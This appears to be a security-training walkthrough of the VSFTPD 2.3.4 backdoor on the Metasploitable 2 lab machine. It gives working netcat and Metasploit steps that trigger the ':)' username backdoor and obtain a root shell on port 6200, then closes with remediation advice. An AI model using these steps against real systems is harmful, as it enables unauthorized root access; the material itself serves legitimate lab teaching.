## The Vulnerability: How it Works
Before we dive into the exploitation, it's important to understand what this vulnerability is and how it functions. Unlike a typical software bug that arises from a coding error, the VSFTPD v2.3.4 backdoor was a deliberate and malicious modification to the program's source code.
### What is VSFTPD?
VSFTPD, which stands for "Very Secure FTP Daemon," is a popular, open-source FTP server for Unix-like systems, including Linux. It's designed to be lightweight, stable, and, as the name implies, secure. For many years, it has been the default FTP server in numerous Linux distributions.
### The Origin of the Backdoor
Around June 2011, an unknown attacker gained access to the server that hosted the official source code for VSFTPD. The attacker uploaded a modified version of the vsftpd-2.3.4.tar.gz` archive. This new archive contained a version of VSFTPD that looked and functioned almost identically to the real one, but with a hidden backdoor secretly added to its code.

This trojanized version was available for download for only a few days before it was discovered and removed, but in that time, it was downloaded by an unknown number of users. The Metasploitable 2 vulnerable machine intentionally includes this compromised version for security training purposes.
### The Backdoor Mechanism
The backdoor is cleverly designed to be triggered by a specific, seemingly harmless input during the FTP login process. Here is the step-by-step process of how it activates:
1. **Normal FTP Connection:** An attacker connects to the FTP service, which runs on the standard **port 21**.
2. **The Trigger:** The FTP server prompts for a username. The backdoor is triggered if the submitted username string ends with the characters (a smiley face). For example, a username like `user:)` or simply `:)` will activate the code. The password provided does not matter and can be anything.
3. **The Payload:** Upon detecting a username ending in :)`, the malicious code within the VSFTPD server executes its primary function: it opens a listening command shell.
4. **The Open Port:** This new command shell does not interact with the user on the current connection (port 21). Instead, it opens a _new_ listener on a high, non-standard TCP port: **6200**.
5. **Root Access:** Anyone who connects to port 6200 on the target machine is immediately granted a command-line shell with the same privileges as the VSFTPD service. In the specific case of Metasploitable 2, the service is misconfigured to run as the **root** user, meaning the shell provides the attacker with the highest level of administrative access to the system.

In summary, a simple smiley face sent as part of a username fools the compromised server into opening a secret, privileged door on port 6200, waiting for the attacker to connect and take control.
## Method 1: Exploiting Manually with Netcat
The manual method provides a deeper understanding of what the exploit is actually doing. We will use two common network utilities: `nmap` to identify the service and `netcat` (or `nc`) to interact with it directly.

### 1. Service Discovery
First, we need to confirm the target is running the vulnerable version of VSFTPD. We can do this with an `nmap` version scan targeting the standard FTP port (21). Replace `<target_ip>` with the IP address of your Metasploitable 2 machine.
```bash
nmap -sV -p 21 <target_ip>
```
The output should clearly show vsftpd 2.3.4, confirming our target is vulnerable
```output
Starting Nmap 7.92 ( https://nmap.org ) at 2025-06-11 10:30 EDT
Nmap scan report for <target_ip>
Host is up (0.00021s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```

### 2. Triggering the Backdoor
Now, we connect to the FTP port using `netcat`. This allows us to send raw commands to the server.
```bash
nc <target_ip> 21
```
Once connected, the server will send a welcome banner. Now, we send the trigger. Type the following username command (including the smiley face) and press Enter:
```bash
USER user:)
```
The server will ask for a password (it might just be an empty line). It doesn't matter what you enter, so you can just type `PASS pass` and press enter. Now the backdoor has been activated. You might get disconnected (this is expected), if not you can manually terminate the session by typing `exit` or with the keyboard shortcut `ctrl+c`.

### 3. Connecting to the Root Shell
The backdoor has now opened a command shell listener on port 6200. Open a new terminal window and use `netcat` again to connect to this port
```bash
nc <target_ip> 6200
```
Upon connecting, you will not see a login prompt. Instead, you will have an interactive command shell. You can confirm you have root access by running the `id` command. The output should look like this:
```output
uid=0(root) gid=0(root)
```
You now have full administrative control over the target machine!
## Method 2: Exploiting with Metasploit
The Metasploit Framework automates the entire process described above. It knows how to trigger the backdoor and connect to the resulting shell, all within a single module.

### 1. Launch Metasploit
First, start the Metasploit Framewrok console.
```bash
msfconsole
```
### 2. Find and Select the Exploit
Use the `search` command to find the correct exploit module for this vulnerability.
```bash
search vsftpd 2.3.4
```
Metasploit will find the module `exploit/unix/ftp/vsftpd_234_backdoor`. Load this module using the `use` command.
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```
### 3. Configure and Run the Exploit
The only required option for this module is the remote host's IP address (`RHOSTS`). Set this to the IP of your Metasploitable 2 machine.
```bash
set RHOSTS <target_ip>
```
You can verify the options with the `show options` command. The `RPORT` is already set to 21 by default, which is correct. Now, run the exploit.
```bash
exploit
```
### 4. Session Opened
Metasploit will perform all the necessary steps automatically. If successful, it will find the open FTP port, send the malicious username, connect to the backdoor on port 6200, and present you with a command shell session.
```output
[*] <target_ip>:21 - Banner: 220 (vsFTPd 2.3.4)
[*] <target_ip>:21 - USER user:): 331 Please specify the password.
[+] <target_ip>:21 - Backdoor service has been spawned, handling...
[+] Found shell.
[*] Command shell session 1 opened (<local_ip>:43779 -> <target_ip>:6200) at 2025-06-11 10:35 EDT
```
As before, you now have a root shell and full control of the system, and just like before you can confirm this with the `id` command. The output should look the same (or similar) as before:
```output
uid=0(root) gid=0(root)
```
## Remidiation
Exploiting vulnerabilities is for learning, but fixing them is the ultimate goal of a security professional. The remediation for this issue is straightforward because this is not a simple bugâ€”it is deliberately compromised software.
The only correct way to fix this vulnerability is to completely remove the malicious software and replace it with a legitimate, updated version.
### 1. Remove the Malicious Software
Use the system's package manager to completely uninstall the `vsftpd` package. For example, on a Debian-based system like Ubuntu, you would run:
```bash
sudo apt-get purge vsftpd
```
### 2. Install a Clean Version
Install `vsftpd` again from your distribution's official, trusted repositories. These repositories contain vetted software that does not have this backdoor.
```bash
sudo apt-get install vsftpd
```
### 3. Principle of Least Privilege
As an additional security best practice, ensure that services like FTP do not run as the `root` user. In a properly configured modern system, the VSFTPD service runs under a dedicated, non-privileged user account (e.g., `ftp`). This limits the damage an attacker can do even if a new vulnerability is discovered in the future. If an attacker exploited the service, they would only gain access as the `ftp` user, not as `root`.
